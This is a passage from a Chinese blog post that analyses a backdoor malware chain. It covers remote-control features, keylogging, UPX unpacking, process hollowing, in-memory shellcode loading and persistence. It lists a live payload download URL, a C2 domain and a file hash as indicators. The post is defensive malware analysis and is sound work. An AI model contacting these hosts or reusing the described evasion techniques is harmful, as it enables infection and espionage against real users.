<li>利用管道实现和C2之间的数据交互<br>  <img src="http://hacky.wang/blog/20190530/ECdPKzU9Lxt9.png?imageslim" alt="mark"></li>
<li>截图<br>  <img src="http://hacky.wang/blog/20190530/X1nCzCbVrg03.png?imageslim" alt="mark"></li>
<li>键盘区域<br>  <img src="http://hacky.wang/blog/20190530/wtWgKpNdbMpJ.png?imageslim" alt="mark"></li>
<li>删除，清空文件<br>  <img src="http://hacky.wang/blog/20190530/BDFdEqEMSBTB.png?imageslim" alt="mark"></li>
<li>清空COOKIE和用户名密码<br>  <img src="http://hacky.wang/blog/20190530/vgx2dLTQ52uX.png?imageslim" alt="mark"></li>
<li>音视频<br>  <img src="http://hacky.wang/blog/20190530/HxEReejnTbhM.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190530/weGL22cJNAxS.png?imageslim" alt="mark"></li>
<li>从Internet上下载数据并执行<br>  <img src="http://hacky.wang/blog/20190530/MD6BA3jtt83K.png?imageslim" alt="mark"></li>
<li>获取服务相关信息<br>  <img src="http://hacky.wang/blog/20190530/7bKJHwCaBzoO.png?imageslim" alt="mark"></li>
</ul>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;综上，对此样本定性为<strong>后门远控类文件</strong>。</p>
<h2 id="0x4-4-298eeexe-exe"><a href="#0x4-4-298eeexe-exe" class="headerlink" title="0x4.4 298eeexe.exe"></a>0x4.4 298eeexe.exe</h2><ul>
<li>从<a href="http://www.gestomarket.co/hqpi64.exe下载文件，并执行" target="_blank" rel="external">http://www.gestomarket.co/hqpi64.exe下载文件，并执行</a><br>  <img src="http://hacky.wang/blog/20190530/CxyVqwMOJysO.png?imageslim" alt="mark"></li>
</ul>
<h2 id="0x4-5-2XC2DF0S-exe"><a href="#0x4-5-2XC2DF0S-exe" class="headerlink" title="0x4.5 2XC2DF0S.exe"></a>0x4.5 2XC2DF0S.exe</h2><ul>
<li>SHA256为2d69c9a9622b9b812db1833caec237995eedd0dee59ece53bd359e7083023f47，查壳是UPX的壳，ESP拖一下.<br>  <img src="http://hacky.wang/blog/20190530/2OIjOJJO2bjn.png?imageslim" alt="mark"></li>
<li>主要使用了SMC技术<br>  <img src="http://hacky.wang/blog/20190530/tDqH0qJrmyse.png?imageslim" alt="mark"></li>
<li><p>根据动态分析，可以得到样本创建了fyhgzmilgyvvgdu.exe和\「开始」菜单\程序\启动\创建fyhgzmilgyvvgdu.eu.url。创建url的目的是实现了fyhgzmilgyvvgdu.exe的自启动<br>  <img src="http://hacky.wang/blog/20190530/izfY42GDjtxG.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190530/PbEFY4NVxBxL.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190530/WARLNynOQVC7.png?imageslim" alt="mark"></p>
</li>
<li><p>创建自身子进程，并进行进程替换<br>  <img src="http://hacky.wang/blog/20190530/RTpRqfT9lrz4.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190530/v1XfIa4p0EgQ.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190530/Ar9bAD4GBcwQ.png?imageslim" alt="mark"></p>
</li>
<li>dump出傀儡进程的PE数据，命名为DumpFrom2d69exe.exe_<br>  <img src="http://hacky.wang/blog/20190530/XBHWFk2lgFEr.png?imageslim" alt="mark"></li>
</ul>
<h2 id="0x4-6-DumpFrom2d69exe-exe"><a href="#0x4-6-DumpFrom2d69exe-exe" class="headerlink" title="0x4.6 DumpFrom2d69exe.exe_"></a>0x4.6 DumpFrom2d69exe.exe_</h2><ul>
<li>首先样本会先链接到C2服务器<code>asdfwrkhl.warzonedns.com</code>，当确认链接上<code>asdfwrkhl.warzonedns.com</code>,此时会从C2上接收数据<br>  <img src="http://hacky.wang/blog/20190531/JnFcBdvpEuNj.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/LuJRzBbnOqD9.png?imageslim" alt="mark"></li>
<li>然后将自身路径写入SOFTWARE\_rptls注册表中，但是注意的是这个是从2XC2DF0S.exe转储出来的，所以原始的模块名应该是2XC2DF0S.exe。加载资源文件，然后有个函数是解密shellcode，然后在把加载入内存的资源文件作为参数传入，初步怀疑应该从内存中执行。这样有效避免了查杀。将资源文件命名为Resource.bin<br>  <img src="http://hacky.wang/blog/20190531/Np5Pu9zW5rXd.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/0LCl60fJ1Om7.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/wsmMrrrwPYBU.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/wm7wdh5PKRs9.png?imageslim" alt="mark"></li>
<li>直接就是一个后门程序的主体框架。主要包括三大类的功能，第一交流通信，第二，下载执行，第三，信息记录，第四，测试退出，第五驻留操作。<br>  <img src="http://hacky.wang/blog/20190531/3VhJKujgaWxF.png?imageslim" alt="mark"></li>
<li>第一：通信交流<br>  <img src="http://hacky.wang/blog/20190531/3zNC6Iv8TbyU.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/jHs9TptLnXU1.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/zoLRanmKhcXJ.png?imageslim" alt="mark"></li>
<li>第二：下载执行，但是由于分析的时候，没有处于攻击窗口期，所以没有办法了解到此次下载的是何种程序，然后加载了一些网络库，运行时库<br>  <img src="http://hacky.wang/blog/20190531/7GeLBDmIARA1.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/A2sUFO3xp63G.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/SzfW0vNHmgMX.png?imageslim" alt="mark"></li>
<li>第三：信息记录，主要是键盘记录，和常见的手段一样，使用了钩子技术，截获用户的键盘输入，并记录按键信息，把并发送个C2服务器<br>  <img src="http://hacky.wang/blog/20190531/bjEvbMaP086q.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/SPgBynQXWoWV.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/oezl9Ao1Mxjq.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/ia62OMkAyqt1.png?imageslim" alt="mark"></li>
<li><p>第四：结束退出，也就是，断开连接，终止线程，删除自身<br>  <img src="http://hacky.wang/blog/20190531/PYQS3fKxCVvl.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/9JBlteNf771m.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/t0Vcy7E3vTn3.png?imageslim" alt="mark"></p>
</li>
<li><p>第五：驻留操作。包含了释放资源，运行服务，添加用户等<br>  <img src="http://hacky.wang/blog/20190531/XTmksNUFolcU.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/ov8jtKnIDlq1.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/FhlkNdjSbCpI.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/T7fbWQtCDoet.png?imageslim" alt="mark"></p>
</li>
</ul>
<h2 id="0x4-7-Resource-bin"><a href="#0x4-7-Resource-bin" class="headerlink" title="0x4.7 Resource.bin"></a>0x4.7 Resource.bin</h2><ul>
<li>释放<code>C:\Users\hacky\AppData\Local\Temp\dismcore.dll</code>和<code>C:\Users\hacky\AppData\Local\Temp\ellocnak.xml</code><br>  <img src="http://hacky.wang/blog/20190531/OXR5A7GOrBVQ.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/3ERiffs6sFkT.png?imageslim" alt="mark"></li>
<li>然后调用C:\Windows\system32\pkgmgr.exe，安装安装KB929761更新包，可能目的是排除竞争者<br>  <img src="http://hacky.wang/blog/20190531/KXFIlim7xvcJ.png?imageslim" alt="mark"></li>
</ul>
<h2 id="0x4-8-dismcore-dll"><a href="#0x4-8-dismcore-dll" class="headerlink" title="0x4.8 dismcore.dll"></a>0x4.8 dismcore.dll</h2><ul>
<li>读取SOFTWARE\_rptls的值，这个是其实是2XC2DF0S.exe的路径，然后截取去文件名。检查进程列表中是否存在这样的进程，有则关闭，然后在重新创建一个进程即可！<br>  <img src="http://hacky.wang/blog/20190531/MCoNO1kE6J0A.png?imageslim" alt="mark"></li>
</ul>
<h1 id="0x5-yara规则编写"><a href="#0x5-yara规则编写" class="headerlink" title="0x5 yara规则编写"></a>0x5 yara规则编写</h1><ul>
<li>   <img src="http://hacky.wang/blog/20190601/YxECxIiG24Nw.png?imageslim" alt="mark"><h1 id="0x6-后记"><a href="#0x6-后记" class="headerlink" title="0x6 后记"></a>0x6 后记</h1>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;学习样本分析两年了，从最开始的简单的蠕虫到后来的勒索病毒，再到挖矿病毒，再到现在的APT样本。总结一下，样本分析最重要的是心细和心诚。心细不多说。何谓心诚，心诚则灵。对于样本，我们也需要有敬畏之心，需要刨根问题，也就是说，作为一个合格的病毒分析师，首先你需要判断文件黑白，但能够辨别黑白也只能给你打60分。如何成为一个优秀的病毒分析师?在于刨根问底，在于洞悉原理，不是简单的知道样本执行了什么操作。肉眼看到的仅仅都只是表面现象。就像这个样本那个宏一样，肉眼可见其实释放了一个exe，但是他是怎么释放的呢？你一概不知，这样你可能就失去了一个可靠的情报，或者说你很有可能凭借这过于自信的判断。导致<strong>你对这样本的判断是错误的.</strong>但是这对于用户来说是致命的。</li>
</ul>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;专科学技术，本科学原理，博硕学辩证。对之于样本分析同，仅仅是懂得辩黑白仅仅就是专科的水平，不屑于言之，若能明晓原理，可达登堂入室之功，最后是辩证，也就是知道为何这样做是可行的，这样做是不可行的，不可行之处在于何处。</p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/05/03/一篇文章带你学会Armadillo脱壳/" rel="next" title="一篇文章带你学会Armadillo脱壳">
                <i class="fa fa-chevron-left"></i> 一篇文章带你学会Armadillo脱壳
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/07/01/病毒分析技术_22_样本分析之Powershell/" rel="prev" title="样本分析之Powershell">
                样本分析之Powershell <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">findream</p>
              <p class="site-description motion-element" itemprop="description">Apes--change the world's animals</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">51</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                
                  <span class="site-state-item-count">10</span>
                  <span class="site-state-item-name">分类</span>
                
              </div>
            

            

          </nav>

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          <div class="links-of-author motion-element">
            
          </div>

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x0-前言"><span class="nav-number">1.</span> <span class="nav-text">0x0 前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x1-目录"><span class="nav-number">2.</span> <span class="nav-text">0x1 目录</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x2-IoC"><span class="nav-number">3.</span> <span class="nav-text">0x2 IoC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x2-1-Hash"><span class="nav-number">3.1.</span> <span class="nav-text">0x2.1 Hash</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x2-2-C2"><span class="nav-number">3.2.</span> <span class="nav-text">0x2.2 C2</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x3-行为分析"><span class="nav-number">4.</span> <span class="nav-text">0x3 行为分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x4-样本分析"><span class="nav-number">5.</span> <span class="nav-text">0x4 样本分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x4-1-4fb430-doc"><span class="nav-number">5.1.</span> <span class="nav-text">0x4.1 4fb430.doc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x4-2-massive-exe"><span class="nav-number">5.2.</span> <span class="nav-text">0x4.2 massive.exe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x4-3-DumpFrommassive-exe"><span class="nav-number">5.3.</span> <span class="nav-text">0x4.3 DumpFrommassive.exe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x4-4-298eeexe-exe"><span class="nav-number">5.4.</span> <span class="nav-text">0x4.4 298eeexe.exe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x4-5-2XC2DF0S-exe"><span class="nav-number">5.5.</span> <span class="nav-text">0x4.5 2XC2DF0S.exe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x4-6-DumpFrom2d69exe-exe"><span class="nav-number">5.6.</span> <span class="nav-text">0x4.6 DumpFrom2d69exe.exe_</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x4-7-Resource-bin"><span class="nav-number">5.7.</span> <span class="nav-text">0x4.7 Resource.bin</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x4-8-dismcore-dll"><span class="nav-number">5.8.</span> <span class="nav-text">0x4.8 dismcore.dll</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x5-yara规则编写"><span class="nav-number">6.</span> <span class="nav-text">0x5 yara规则编写</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x6-后记"><span class="nav-number">7.</span> <span class="nav-text">0x6 后记</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">findream</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.3</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>

  
  <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>



  


  




	





  





  












  





  

  

  
  

  

  

  

</body>
</html>
